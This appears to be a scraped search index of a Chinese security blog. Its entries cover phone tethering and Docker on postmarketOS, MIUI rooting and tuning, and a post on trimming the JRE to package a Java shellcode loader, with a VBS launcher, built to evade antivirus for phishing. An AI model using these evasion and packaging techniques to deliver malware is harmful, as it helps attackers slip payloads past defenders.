通过USB共享网络当前的系统版本WIFI有BUG不能用，修复的分支官方还没有merge：https://gitlab.com/msm8998-mainline/linux/-/merge_requests/2，所以我们要想一些另外的办法来联网。 按照官方教程 https://wiki.postmarketos.org/wiki/USB_Internet，在Ubuntu中以root权限输入以下命令： sysctl net.ipv4.ip_forward=1 iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT iptables -A FORWARD -s 172.16.42.0/24 -j ACCEPT iptables -A POSTROUTING -t nat -j MASQUERADE -s 172.16.42.0/24 iptables-save ufw disable 然后ping一下百度试试，这个时候已经可以联网了。 ","date":"2022-12-10","objectID":"/posts/android-run-docker/:3:4","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#通过usb共享网络"},{"categories":null,"content":"\r3.5 Hello from Docker!终于要进入安装Docker的环节了，首先更新一下系统，然后apk add docker Hello from Docker! 我们终于成功在手机上运行了Docker。 看下htop 空间使用 ","date":"2022-12-10","objectID":"/posts/android-run-docker/:3:5","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#hello-from-docker"},{"categories":null,"content":"\r4 玩法扩展小米6的处理器是骁龙835，8核，10nm，2.45GHz，对比树莓派4B CPU BCM2711 4核 28nm 1.5 GHz。旧手机拿来当开发板，这不比树莓派香？触摸屏WIFI蓝牙红外都配齐了。 根据cpubenchmark的跑分对比，835的跑分几乎是树莓派CPU的三倍：https://www.cpubenchmark.net/compare/4297vs3919/BCM2711-vs-Qualcomm-Technologies,-Inc-MSM8998 不过美中不足的是小米的手机一直是USB2.0，IO简直是龟速。。。外接个硬盘也就十几M速度。。。跑重IO的业务是不太行了。 现在，我们的小米6摇身一变，变成了一个性能还不错的Linux开发板。我们可以安装php+nginx搭个博客，或者在家里跑Homeassistant等等。 作为一个安全从业者，还是会想是否能在安全场景下有所应用。想象一个场景：在近源渗透的时候，如果拿着电脑或者树莓派，一眼就看起来很奇怪。但是如果我们把这些东西装进手机，这样伪装性就会大大增加，之前也有师傅研究过这个课题：https://www.anquanke.com/post/id/204544。 Kali虽然有NetHunter，但是受限于安卓系统，NetHunter还是很难发挥出原生Kali的所有功能；而安装pmOS后的手机是一个完整的Linux，理论上能够实现所有原生Kali的功能。不过以上只是猜想，具体可行性还有待验证。 ","date":"2022-12-10","objectID":"/posts/android-run-docker/:4:0","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#玩法扩展"},{"categories":null,"content":"\r5 最后终于给手机安装上了Docker，不过然后呢？好像也并不会真的用到它。不过刷机享受的就是折腾的过程，在手机上跑Docker，不觉得很酷吗？作为一名理工男我觉得这太酷了，很符合我对未来生活的想象，科技并带着趣味。 ","date":"2022-12-10","objectID":"/posts/android-run-docker/:5:0","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#最后"},{"categories":null,"content":"MIUI系统拯救计划","date":"2022-11-06","objectID":"/posts/save-my-miui-system/","series":null,"tags":[],"title":"MIUI系统拯救计划","uri":"/posts/save-my-miui-system/"},{"categories":null,"content":"\r1 背景最近被迫又重新学习了一下安卓以及刷机相关的知识，原因是刚买不到几个月的小米手机又又又又开始卡了。 自己平常也不玩游戏，只是聊聊微信，看看B站啥的。理论上来说，是远远不到手机性能的瓶颈的，3年前的865也能满足我的需求，更不用说手里这台骁龙8G1处理器的小米12了。但实际上，不仅卡，卡的还跟PPT一样，每次连地铁扫码都要卡半天，体验极差。 经过两周的折腾跟实验，终于让手机的流畅程度有了质的飞跃。这里总结了一些优化的措施，跟大家一起分享。 ","date":"2022-11-06","objectID":"/posts/save-my-miui-system/:1:0","series":null,"tags":[],"title":"MIUI系统拯救计划","uri":"/posts/save-my-miui-system/#背景"},{"categories":null,"content":"\r2 解锁BL解锁BL的教程有很多，这里不再赘述。解锁BL是优化的必经之路，同时要承担解锁的后果：你的手机一定不能丢，否则里面的数据以及你的手机都不再安全。 不解锁不ROOT可以吗？之前本人试过用adb卸载内置应用，结果MIUI里面的广告以及信息采集等应用总是一开机就装回来了，非常顽固。 ","date":"2022-11-06","objectID":"/posts/save-my-miui-system/:2:0","series":null,"tags":[],"title":"MIUI系统拯救计划","uri":"/posts/save-my-miui-system/#解锁bl"},{"categories":null,"content":"\r3 刷入TWRPTWRP是一个强大的第三方Recovery。Recovery又被称作rec，恢复模式，刷机模式等等。其功能大致类似于U盘重装系统时的WinPE，在另外的分区提供一个功能简易的小型操作系统，主要用来刷入.zip，格式化分区等。 小米12国内没找到现成的TWRP，在XDA上找到一个老哥移植后的版本：https://dl.akr-developers.com/?dir=skkk/TWRP/A12 ，需要注意的是第一次刷了6.x版本会卡米，后面改为[BOOT]3.6.2_12-Mi12_v5.1_A12-cupid-skkk_bdb9bb8d.img这个版本成功进入。 因为小米12是VAB架构，已经去掉了recovery分区，所以临时启动后还要再操作一步安装到ramdisk fastboot boot rec.img 高级-刷入当前TWRP/安装recovery ramdisk ","date":"2022-11-06","objectID":"/posts/save-my-miui-system/:3:0","series":null,"tags":[],"title":"MIUI系统拯救计划","uri":"/posts/save-my-miui-system/#刷入twrp"},{"categories":null,"content":"\r4 系统优化刷系统的目的是干掉国内系统中流氓组件，包括且不限于信息采集，后台监控，广告推广等。当然也可以选择用小黑屋等把内置应用冻结起来，但是刷系统的方法更加彻底。 首选当然是类原生，并且是有团队维护的版本，不然有BUG了很难受。不过最后还是选择了MIUI，原因有两点，一是找了一圈发现小米12目前也没有其他第三方ROM，很多都还没支持；二是已经习惯了MIUI，懒得再去适应一种新的系统了。 MIUI其实有三个版本： 官方推出的国内版MIUI：miui.com 官方推出的国际版MIUI：global.miui.com 第三方推出的欧版MIUI：xiaomi.eu 国内版MIUI也就是我们出厂时候内置的，非常的臃肿，也是我们要优化的目标。 官方推出的国际版MIUI虽然没有国内的MIUI广告多，但是仍有AnalyticsCore、MSA-Global等广告后台。 EU版是欧盟和MIUI认证的民间版本，更新速度与国内测试版平行，正式版甚至比国内发布还快，广告全无且谷歌套件只有谷歌商店和GMS，非常干净。如果是轻度使用用户想搞个没广告的小米系统，推荐EU版。 第一次刷机就搞错了，刷成官方的国际版了，这玩意不仅有广告，更坑人的是系统居然不支持双卡？？后来又刷成了EU版本，终于解决了双卡的问题，并且确实没有AnalyticsCore这个东西了，非常的清爽，当时刷机的时候，EU版甚至比官方MIUI稳定版还快一个版本。 刷机方法：进入TWRP然后sideload刷入EU版系统的ZIP包即可。 adb sideload xiaomi.eu.zip 刷完后开机，看到MIUI by xiaomi.eu的字样，就说明刷对系统了。 更详细的刷机教程：https://zhuanlan.zhihu.com/p/408114647 其他的一些类原生系统：https://miuiver.com/aosp-rom-of-xiaomi/ ","date":"2022-11-06","objectID":"/posts/save-my-miui-system/:4:0","series":null,"tags":[],"title":"MIUI系统拯救计划","uri":"/posts/save-my-miui-system/#系统优化"},{"categories":null,"content":"\r5 刷入Magisk刷模块的记忆还停留在xposed，当时应该还没有magisk。但是现在想要用xposed的模块还要在magisk中安装一个lsposed，然后在lsposed中再去安装模块。 刚开始并不太理解magisk的模块跟xposed模块的区别，认为magisk是xposed的替代品，xposed的模块应该也能装到magisk中。现在看来magisk更偏向于系统中的模块修改，模块的内容主要是执行一段Shell命令。lsposed中的模块主要应用于具体APP中的修改与hook，例如QQ/微信防撤回等。另外Magisk提供了ROOT管理的功能，刷入Magisk就等于ROOT了，可以当一个SuperSU来用。 从https://github.com/topjohnwu/Magisk/releases下载最新的.apk文件，安装。 apk文件后缀修改为.zip文件，重启进入TWRP刷入zip。 重启进入系统，打开magisk如果没报错就已经获取了ROOT。 至此，我们的准备工作已经完毕。 ","date":"2022-11-06","objectID":"/posts/save-my-miui-system/:5:0","series":null,"tags":[],"title":"MIUI系统拯救计划","uri":"/posts/save-my-miui-system/#刷入magisk"},{"categories":null,"content":"\r6 温控优化“为什么新手机一出旧手机自动就变卡了？”这本来是一句玩笑话，现在看来确实有可能是真的。因为很多手机都会存在云端温控这个东西：厂商会把温控配置文件放到云端，做到远程对手机性能的控制。 官方的调度一般都比较保守，首先保证的是省电跟不发热，也就是俗称的“怂调度”，当然也不排除一些商业原因XXX 我的手机我做主，直接扬了。这里我用的是【淦！MIUI温控】这个工具。在酷安就可以下载安装。 首先获取ROOT权限后修改为【均衡模式】，然后在【其他】中【禁用Joyose】，其他的选项可以改改试试。修改完再打开APP感觉到手机确实变得不一样了，轻微发热状态下也不会再降频了，可以保持流畅运行。 ","date":"2022-11-06","objectID":"/posts/save-my-miui-system/:6:0","series":null,"tags":[],"title":"MIUI系统拯救计划","uri":"/posts/save-my-miui-system/#温控优化"},{"categories":null,"content":"\r7 调度优化本来只装了一个淦温控，然后发现一个问题：如果是均衡模式，APP切换的频繁了，或者看视频手机发热了后还是会降频；但是如果调整到性能模式或者淦模式就会很耗电，所有的APP都拉满了跑。 按照我的理解，温控决定的是手机多少度开始限制多少发挥的性能，调度其实是面对什么场景使用多少性能比例。例如打游戏的时候当然要把性能拉满，但是平常锁屏就进入低功耗状态，维持省电。但是我们还需要一个负责性能调度的软件，来控制不同软件不同场景下更细粒度的调度。 这里在多方对比之下使用了scene5作为调度优化工具【非广告】。这个软件并不完全免费，刚开始可以先免费体验15天，15天后需要购买激活码，大概是15块钱。但是确实做的体验很好，每个点都有解释，功能很全。scene5比较适合懒人，其他免费的也有yc调度等调度软件。可能是无端的猜想，自己总是感觉付费的一定程度上比用爱发电要靠谱一些。一番使用下来感觉15块钱确实物有所值。 以下是应用主界面，可以看到CPU，GPU，内存的的负载情况\r安装scene5后，我把淦温控调整为性能模式，配置源选择Scene在线，开启动态响应。默认均衡模式，待机时选择省电模式，并且开启延迟切换。\rMIUI还有一个恶心人的地方就是杀后台很严重，切换一下应用就会重新触发热加载。scene里也有对应的保后台模块，下载后在Magisk中刷入即可。 手机的Swap开了简直是负优化。在MIUI系统设置中关闭【内存扩展】功能，在Scene中关闭并删除Swapfile。ZRAM是把现有的内存进行压缩，能放下更多的内容但是会消耗额外的CPU。酷安上有帖子测试过其耗电几乎可以不计，对于性能较好的手机来说建议开启，这里我设置的是4G，基本可以满足日常需要。 ","date":"2022-11-06","objectID":"/posts/save-my-miui-system/:7:0","series":null,"tags":[],"title":"MIUI系统拯救计划","uri":"/posts/save-my-miui-system/#调度优化"},{"categories":null,"content":"\r8 体验一通设置下来之后，手里的小米12简直脱胎换骨，使用体验有了质的飞跃！就像鸟枪换大炮、2G换5G一样，非常的丝滑流畅。轻度使用五个半小时差不多还剩50%的电，也基本符合预期。整体的体验就是非常的流畅，发热也不严重。 ","date":"2022-11-06","objectID":"/posts/save-my-miui-system/:8:0","series":null,"tags":[],"title":"MIUI系统拯救计划","uri":"/posts/save-my-miui-system/#体验"},{"categories":null,"content":"\r9 最后获取ROOT、安装了Magisk跟lsposed后感觉进入了新世界的大门，第一次有了“自己的手机自己做主”的感觉。酷安上还有很多奇奇怪怪神神秘秘的模块，都可以试一试但是不建议装的太多，一是耗电二是增加了不安全不稳定。 小米的性价比真的是做到了机制，不像xx厂888卖到4k+。但是系统优化方面真的是一言难尽，已经把用户逼到了必须要手动去修改底层调度的程度，甚至还衍生出了专门的调度优化产业。对于一般的用户来说，可能只是会觉得安卓不行/手机该换了等等，但实际上可能只是国内毒瘤APP利用权限在耍流氓，或者系统的性能没有发挥到最优。自己作为计算机相关从业者，还是不愿意低头，还是想要想办法优化优化。这过程中在酷安上也看到了很多前人写的优秀的帖子跟教程，学到了许多相关的知识。 本文仅以本人的经历来写，可能其他机型并不适合，请根据实际情况酌情调整。刷机千万条，备份第一条。数据无价，捣鼓之前切记先备份。 ","date":"2022-11-06","objectID":"/posts/save-my-miui-system/:9:0","series":null,"tags":[],"title":"MIUI系统拯救计划","uri":"/posts/save-my-miui-system/#最后"},{"categories":null,"content":"精简JRE打造无依赖的Java-ShellCode-Loader","date":"2022-06-11","objectID":"/posts/litejre-for-shellcode-loader/","series":null,"tags":[],"title":"精简JRE,打造无依赖的Java-ShellCode-Loader","uri":"/posts/litejre-for-shellcode-loader/"},{"categories":null,"content":" 首发于公众号：网络安全回收站 @yzddMr6 ","date":"2022-06-11","objectID":"/posts/litejre-for-shellcode-loader/:0:0","series":null,"tags":[],"title":"精简JRE,打造无依赖的Java-ShellCode-Loader","uri":"/posts/litejre-for-shellcode-loader/#"},{"categories":null,"content":"\r1 前言​ 利用小众语言进行免杀一直是一个屡试不爽的方法，从python到go再到现在的nim免杀，用的人越多杀软的检测也就越来越严格。现在自己写的go程序基本只要涉及到网络通信360就干掉了。那么还有没有什么新的姿势呢？ 之前介绍过在As-Exploits中用到的基于JNA实现的ShellCodeLoader(https://t.zsxq.com/022FQrFAu)，这个Loader在精简后不到1m，配合JarLoader模块在插件里面可以直接内存加载，文件不落地。后来发现落地了问题也不大，到现在VT还是0/57。所以后来抽出来作为一个单独的项目：https://github.com/yzddmr6/Java-Shellcode-Loader\r实战里面有Java的WebShell用起来非常方便，一键免杀xxx。但是缺点是如果用来钓鱼，或者碰上jdk环境过高过低都用不了，还是有局限性。所以就研究了一下怎么跟jre一起打包成一个单独的可执行文件exe。 ​ 目前成果如下：用自解压精简后带jre环境的exe只有6.5m，用Enigma Virtual Box压缩模式8.5m，跟python打包后差不多大小，VT 6/67，基本可以实现我们的需求。 ","date":"2022-06-11","objectID":"/posts/litejre-for-shellcode-loader/:1:0","series":null,"tags":[],"title":"精简JRE,打造无依赖的Java-ShellCode-Loader","uri":"/posts/litejre-for-shellcode-loader/#前言"},{"categories":null,"content":"\r2 jre目录结构原版一个jre大概快200m，在没有安装jre环境的普通用户来说，显然带着整个jre和后门一起打包是不可能的了，但我们可以从jre中提取加载后门时需要用到的class文件,并集合到一起,这样就能大大压缩jre的体积。 jre最主要的两个目录是bin跟lib，bin下主要是各类dll跟可执行文件，lib下是java的依赖库。精简jre就可以从这两方面入手。 ","date":"2022-06-11","objectID":"/posts/litejre-for-shellcode-loader/:2:0","series":null,"tags":[],"title":"精简JRE,打造无依赖的Java-ShellCode-Loader","uri":"/posts/litejre-for-shellcode-loader/#jre目录结构"},{"categories":null,"content":"\r2.1 lib目录access-bridge-64.jar Java Accessibility API是Java Accessibility Utilities的一部分，它是一组实用程序类，可帮助辅助技术提供对实现Java Accessibility API的GUI工具包的访问。 charsets.jar Java 字符集，包含 Java 所有支持字符的字符集 cldrdata.jar Unicode CLDR为软件提供了支持世界语言的关键构建块，提供了最大和最广泛的语言环境数据库。 这些数据被广泛的公司用于其软件国际化和本地化，使软件适应不同语言的惯例以用于此类常见软件任务. deploy.jar Java安装目录的常见部分 - 该文件运行某些产品的安装。 正确设置Java路径后，用户可以执行此文件（只需双击它或按文件上的Enter键），要部署的应用程序将运行其安装程序。 例如。 诺基亚OVI套件通常使用这种部署形式。 作为彼此的JAVA包，如果您将其重命名为ZIP并打开内容，则可以检查包中的类。 dnsns.jar 即DNS naming service ,提供DNS地址服务的包，里面只有2个方法 getHostByAddr和 lookupAllHostAddr jaccess.jar 定义Assistive Technologies.AWT（Abstract Window Toolkit）使用的JDK实用程序类 javaws.jar JNLP（Java Network Launching Protocol ）是java提供的一种可以通过浏览器直接执行java应用程序的途径。 jce.jar java类库是java发布之初就确定了的基础库， 而javax类库则是在上面增加的一层东西，就是为了保持版本兼容要保存原来的，但有些东西有了更好的解决方案， 所以，就加上些，典型的就是awt(Abstract Windowing ToolKit) 和swing。） 这个包都是加密相关的。 jfr.jar 和 jdk\\bin\\jmc.exe有关系。Java Mission Control 包括 JMX 控制台和 Java 飞行记录器。 Java 飞行记录器 (JFR) 是一个用于收集有关正在运行的 Java 应用程序的诊断数据和概要分析数据的工具。它集成到 Java 虚拟机 (JVM) 中， 几乎不会带来性能开销，因此甚至可以在高负载生产环境中使用。使用默认设置时，内部测试和客户反馈表明性能影响低于 1%。 对于一些应用程序，这一数字会大幅降低。但是，对于短时间运行的应用程序 (不是在生产环境中运行的应用程序类型)， 相对的启动和预热时间可能会较长，这对性能的影响可能会超过 1%。JFR 收集有关 JVM 及其上运行的 Java 应用程序的数据。 jfxrt.jar JDK有个 rt.jar ，是存储JAVA语言核心类的的。这个jfxrt.jar就相当于JavaFX的rt.jar. JavaFX是一组图形和媒体包，使开发人员能够设计，创建，测试，调试和部署在不同平台上一致运行的富客户端应用程序。在jdk最新的发版当中，javafx的包已经被移除了。 jfxswt.jar 也是和JavaFx相关，为JavaFx和Swing提供一些兼容性操作。 jsse.jar SSL连接，验证的包， localedata.jar 日期显示国际化的包，里面包含各地区的日期文字。 management-agent.jar 里面只有一个文本文件。 nashorn.jar 包括 1.动态链接.包含用于链接调用的动态调用站点的接口和类。 dynalink与java.lang.invoke包密切相关，并且依赖于该包。 虽然java.lang.invoke为invoke dynamic调用站点的动态链接提供了一个低级别的API，但它不提供一种方法来表示对象的更高级别操作，也不提供实现这些操作的方法。 如果一种语言是静态类型的，并且它的类型系统与JVM的类型系统匹配，那么它可以使用通常的调用、字段访问等指令（例如invokevirtual、getfield）来实现这一点。 但是，如果语言是动态的（因此，某些表达式的类型直到在运行时进行计算时才知道），或者其对象模型或类型系统与JVM的对象模型或类型系统不匹配， 那么它应该使用invokedynamic调用站点，并让dynalink管理它们。 2.Javascript引擎 从 JDK 8 开始，Nashorn取代 Rhino 成为 Java 的嵌入式 JavaScript 引擎。Nashorn 完全支持ECMAScript 5.1 规范以及一些扩展。该特性允许开发人员将 JavaScript 代码嵌入到 Java 中，甚至从嵌入的 JavaScript 中调用 Java。此外， 它还提供了使用jrunscript从命令行运行 JavaScript 的能力。 plugin.jar 功能很庞大的一个包。 resources.jar 提示信息显示国际化的包，里面各地区的文字,图片等。 rt.jar java核心源代码包 sunec.jar ,sunjce_provider.jar,sunmscapi.jar,sunpkcs11.jar 都是加密相关的包。 zipfs.jar java 对zip文件操作的支持。 ","date":"2022-06-11","objectID":"/posts/litejre-for-shellcode-loader/:2:1","series":null,"tags":[],"title":"精简JRE,打造无依赖的Java-ShellCode-Loader","uri":"/posts/litejre-for-shellcode-loader/#lib目录"},{"categories":null,"content":"\r2.2 bin目录只找到了jdk/bin目录的介绍，jre有些没有，将就着看一下吧 appletviewer.exe 用于运行并浏览applet小程序。 apt.exe 注解处理工具(Annotation Processing Tool)，主要用于注解处理。 extcheck.exe 扩展检测工具，主要用于检测指定jar文件与当前已安装的Java SDK扩展之间是否存在版本冲突。 idlj.exe IDL转Java编译器(IDL-to-Java Compiler)，用于为指定的IDL文件生成Java绑定。IDL意即接口定义语言(Interface Definition Language)。 jabswitch.exe Java访问桥开关(Java Access Bridge switch)，用于启用/禁用Java访问桥。Java访问桥内置于Java 7 Update 6及以上版本，主要为Windows系统平台提供一套访问Java应用的API。 jar.exe jar文件管理工具，主要用于打包压缩、解压jar文件。 jarsigner.exe jar密匙签名工具。 java.exe Java运行工具，用于运行.class字节码文件或.jar文件。 javac.exe Java编译工具(Java Compiler)，用于编译Java源代码文件。 javadoc.exe Java文档工具，主要用于根据Java源代码中的注释信息生成HTML格式的API帮助文档。 javafxpackager.exe JavaFX包装器，用于执行与封装或签名JavaFX应用有关的任务。 javah.exe Java头文件工具，用于根据Java类生成C/C++头文件和源文件(主要用于JNI开发领域)。 javap.exe Java反编译工具，主要用于根据Java字节码文件反汇编为Java源代码文件。 java-rmi.exe Java远程方法调用(Java Remote Method Invocation)工具，主要用于在客户机上调用远程服务器上的对象。 javaw.exe Java运行工具，用于运行.class字节码文件或.jar文件，但不会显示控制台输出信息，适用于运行图形化程序。 javaws.exe Java Web Start，使您可以从Web下载和运行Java应用程序，下载、安装、运行、更新Java应用程序都非常简单方便。 jcmd.exe Java 命令行(Java Command)，用于向正在运行的JVM发送诊断命令请求。 jconsole.exe 图形化用户界面的监测工具，主要用于监测并显示运行于Java平台上的应用程序的性能和资源占用等信息。 jdb.exe Java调试工具(Java Debugger)，主要用于对Java应用进行断点调试。 jhat.exe Java堆分析工具(Java Heap Analysis Tool)，用于分析Java堆内存中的对象信息。 jinfo.exe Java配置信息工具(Java Configuration Information)，用于打印指定Java进程、核心文件或远程调试服务器的配置信息。 jmap.exe Java内存映射工具(Java Memory Map)，主要用于打印指定Java进程、核心文件或远程调试服务器的共享对象内存映射或堆内存细节。 jmc.exe Java任务控制工具(Java Mission Control)，主要用于HotSpot JVM的生产时间监测、分析、诊断。 jps.exe JVM进程状态工具(JVM Process Status Tool)，用于显示目标系统上的HotSpot JVM的Java进程信息。 jrunscript.exe Java命令行脚本外壳工具(command line script shell)，主要用于解释执行javascript、groovy、ruby等脚本语言。 jsadebugd.exe Java可用性代理调试守护进程(Java Serviceability Agent Debug Daemon)，主要用于附加到指定的Java进程、核心文件，或充当一个调试服务器。 jstack.exe Java堆栈跟踪工具，主要用于打印指定Java进程、核心文件或远程调试服务器的Java线程的堆栈跟踪信息。 jstat.exe JVM统计监测工具(JVM Statistics Monitoring Tool)，主要用于监测并显示JVM的性能统计信息。 jstatd.exe jstatd(VM jstatd Daemon)工具是一个RMI服务器应用，用于监测HotSpot JVM的创建和终止，并提供一个接口，允许远程监测工具附加到运行于本地主机的JVM上。 jvisualvm.exe JVM监测、故障排除、分析工具，主要以图形化界面的方式提供运行于指定虚拟机的Java应用程序的详细信息。 keytool.exe 密钥和证书管理工具，主要用于密钥和证书的创建、修改、删除等。 kinit.exe 主要用于获取或缓存Kerberos协议的票据授权票据。 klist.exe 允许用户查看本地凭据缓存和密钥表中的条目(用于Kerberos协议)。 ktab.exe Kerberos密钥表管理工具，允许用户管理存储于本地密钥表中的主要名称和服务密钥。 native2ascii.exe 本地编码到ASCII编码的转换器(Native-to-ASCII Converter)，用于\"任意受支持的字符编码\"和与之对应的\"ASCII编码和(或)Unicode转义\"之间的相互转换。 orbd.exe 对象请求代理守护进程(Object Request Broker Daemon)，它使客户端能够透明地定位和调用位于CORBA环境的服务器上的持久对象。 pack200.exe JAR文件打包压缩工具，它可以利用Java类特有的结构，对普通JAR文件进行高效压缩，以便于能够更快地进行网络传输。 packager.exe 这是微软提供的对象包装程序，用于对象安装包。 policytool.exe 策略工具，用于管理用户策略文件(.java.policy)。 rmic.exe Java RMI 编译器，为使用JRMP或IIOP协议的远程对象生成stub、skeleton、和tie类，也用于生成OMG IDL。 rmid.exe Java RMI 激活系统守护进程，rmid启动激活系统守护进程，允许在虚拟机中注册或激活对象。 rmiregistry.exe Java 远程对象注册表，用于在当前主机的指定端口上创建并启动一个远程对象注册表。 schemagen.exe XML schema生成器，用于生成XML schema文件。 serialver.exe 序列版本命令，用于生成并返回serialVersionUID。 servertool.exe Java IDL 服务器工具，用于注册、取消注册、启动和终止持久化的服务器。 tnameserv.exe Java IDL瞬时命名服务。 unpack200.exe JAR文件解压工具，将一个由pack200打包的文件解压提取为JAR文件。 wsgen.exe XML Web Service 2.0的Java API，生成用于JAX-WS Web Service的JAX-WS便携式产物。 wsimport.exe XML Web Service 2.0的Java API，主要用于根据服务端发布的wsdl文件生成客户端存根及框架 xjc.exe 主要用于根据XML schema文件生成对应的Java类。 ","date":"2022-06-11","objectID":"/posts/litejre-for-shellcode-loader/:2:2","series":null,"tags":[],"title":"精简JRE,打造无依赖的Java-ShellCode-Loader","uri":"/posts/litejre-for-shellcode-loader/#bin目录"},{"categories":null,"content":"\r3 精简rt.jarrt.jar是java核心源代码包，原版有61m，我们主要的精简也就是从这里入手。原理是jar包运行是加上-XX:+TraceClassLoading参数可以打印出所有被加载过的class文件，然后在对这部分class进行二次打包，生成我们的精简rt.jar。这里借MG师傅的图一用： 代码是参考MG1937师傅的这篇文章，https://www.cnblogs.com/aldys4/p/14879607.html，修改后代码如下： import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; import java.util.ArrayList; import java.util.List; public class Main { public static void main(String[] arg) throws IOException { Runtime runtime = Runtime.getRuntime(); String[] command = {\"java\", \"-jar\", \"-XX:+TraceClassLoading\", \"D:\\\\ShellcodeLoader_jar\\\\ShellcodeLoader.jar\", \"aaaa\"}; //这里要加上参数 Process process = runtime.exec(command); BufferedReader bReader = new BufferedReader(new InputStreamReader(process.getInputStream())); StringBuffer sBuffer = new StringBuffer(); List\u003cString\u003e list = new ArrayList\u003cString\u003e(); int i = 0; String lineString; while ((lineString = bReader.readLine()) != null) { String core = getCore(lineString); if (core != \"\") { sBuffer.append(\"\\n\" + core); list.add(getCore(lineString.replace(\".\", \"/\"))); } i++; } bReader.close(); System.out.println(sBuffer.toString()); list.add(0, \"D:\\\\rt.jar\"); list.add(0, \"xvf\"); list.add(0, \"jar\"); String[] jar = list.toArray(new String[list.size()]); process = runtime.exec(jar); getOutput(process); System.out.println(\"Load class:\" + i); System.out.println(\"jar xvf done!\"); String[] cmdJarPackage = cmd(\"jar cvf rt.jar com java javax META-INF org sun sunw\"); runtime.exec(cmdJarPackage); System.out.println(\"All done!\"); } public static String getCore(String line) { String result = null; if (line.startsWith(\"[Loaded\")) { if (line.indexOf(\".jna.\") \u003e 0 || line.indexOf(\"asexploits\") \u003e 0) { return \"\";//过滤jna包跟我们自己的包名 } else { result = line.split(\" \")[1]; } return result; } else { return \"\"; } } public static String[] cmd(String cmd) { return cmd.split(\" \"); } public static void getOutput(Process process) throws IOException { BufferedReader bReader = new BufferedReader(new InputStreamReader(process.getInputStream())); while (bReader.readLine() != null) { System.out.println(\"\\n\" + bReader.readLine()); } } } 这里有一个坑点，就是第一次获取加载的class信息的时候没有加上ShellCode参数，也就会导致有些运行期间才会用到的类没有加载。 解决办法就是加上要执行的ShellCode，把执行过程中所有加载的类都暴露出来，然后再打包。这里的aaaa随便写，只要能走到注入的过程就可以。可以看到现在的rt.jar已经不报错了。 精简之前lib目录是104m，现在已经压缩到44m了。 我们压缩后的rt.jar也只有1.8m大小 这样肯定还是不够的，剩下目录里也有很多冗余的文件，这部分基本直接删除就可以了，不需要二次打包。另外charsets.jar还是有优化空间的，可以用类似rt.jar的方法进行精简，这里就懒得处理了。 最后的lib只有5m大小了。 ","date":"2022-06-11","objectID":"/posts/litejre-for-shellcode-loader/:3:0","series":null,"tags":[],"title":"精简JRE,打造无依赖的Java-ShellCode-Loader","uri":"/posts/litejre-for-shellcode-loader/#精简rtjar"},{"categories":null,"content":"\r4 精简dllbin目录同样很大，也是我们要优化的对象。 这里采取的办法是用process explorer查看程序运行时加载了哪些dll或者exe，仅保留这部分，其他的都可以删掉。 注意这里最好加一个System.in.read()保持控制台不退出，不然就会一闪而过，process explorer就看不到了。 还有一个简单的办法，在程序跑起来的同时，删除bin目录下所有文件，如果提示被占用了那么就是被打开了，把这部分跳过即可。 精简过后的bin目录大概10m，主要是jvm.dll比较大。他是jvm的核心链接库，不能轻易改动。 ","date":"2022-06-11","objectID":"/posts/litejre-for-shellcode-loader/:4:0","series":null,"tags":[],"title":"精简JRE,打造无依赖的Java-ShellCode-Loader","uri":"/posts/litejre-for-shellcode-loader/#精简dll"},{"categories":null,"content":"\r5 自解压捆绑执行环境整好了，接下来就是让他跑起来。自解压是钓鱼老套路了，搞个vbs来运行我们的jar。这里的ShellcodeLoader.jar我硬编码了一个弹计算器的ShellCode先测试一下。 Set ws = CreateObject(\"Wscript.Shell\") ws.run \"cmd /c .\\jre\\bin\\java.exe -jar .\\ShellcodeLoader.jar\" 执行成功 压缩出来6.5m VT 6/62还好，但是360杀了，估计自解压这种已经进特征库了。 ","date":"2022-06-11","objectID":"/posts/litejre-for-shellcode-loader/:5:0","series":null,"tags":[],"title":"精简JRE,打造无依赖的Java-ShellCode-Loader","uri":"/posts/litejre-for-shellcode-loader/#自解压捆绑执行"},{"categories":null,"content":"\r6 EnigmaVirtualBox打包全部文件自解压估计已经被重点监控了，用EnigmaVirtualBox把jre跟jar打包成一个单独的exe试试 这里install.exe是偷懒用msfvenom -p windows/exec生成的 可以执行，但是会有UAC提示框，不太行 VT上查杀过半了，看来不能偷懒 后来又用C++写了一个exe去调用，还是杀的比较多 ","date":"2022-06-11","objectID":"/posts/litejre-for-shellcode-loader/:6:0","series":null,"tags":[],"title":"精简JRE,打造无依赖的Java-ShellCode-Loader","uri":"/posts/litejre-for-shellcode-loader/#enigmavirtualbox打包全部文件"},{"categories":null,"content":"\r7 EnigmaVirtualBox打包jre不过话说我为什么要打包到一起呢，沙箱里面一跑就出来了，这就失去了jar的优势：jar除了可以分离真正的Payload以外，本身就可以加各种混淆，各种商业软件也都是带混淆的，杀软也不能直接杀。 转换思路，我可以仅打包一个人畜无害的jre到exe，然后再jre.exe -jar xxx去调用。 打包方法同上，打包出来后8.2m，测试一下能不能用 执行成功 xxx不杀 VT测一下还有6个引擎检出。。。这tm就是个java.exe啊，还Static ML，真就瞎告呗。这样说我也能搞一个杀毒引擎，看到PE头就杀，名字就叫Deep Static ML。 ","date":"2022-06-11","objectID":"/posts/litejre-for-shellcode-loader/:7:0","series":null,"tags":[],"title":"精简JRE,打造无依赖的Java-ShellCode-Loader","uri":"/posts/litejre-for-shellcode-loader/#enigmavirtualbox打包jre"},{"categories":null,"content":"\r8 最后本文仅用于安全研究，请勿用于非法用途。如果有什么问题欢迎交流。 ","date":"2022-06-11","objectID":"/posts/litejre-for-shellcode-loader/:8:0","series":null,"tags":[],"title":"精简JRE,打造无依赖的Java-ShellCode-Loader","uri":"/posts/litejre-for-shellcode-loader/#最后"},{"categories":null,"content":"Java表达式注入的武器化利用","date":"2022-06-11","objectID":"/posts/java-expression-exploit/","series":null,"tags":[],"title":"Java表达式注入的武器化利用","uri":"/posts/java-expression-exploit/"},{"categories":null,"content":" 首发于公众号：网络安全回收站 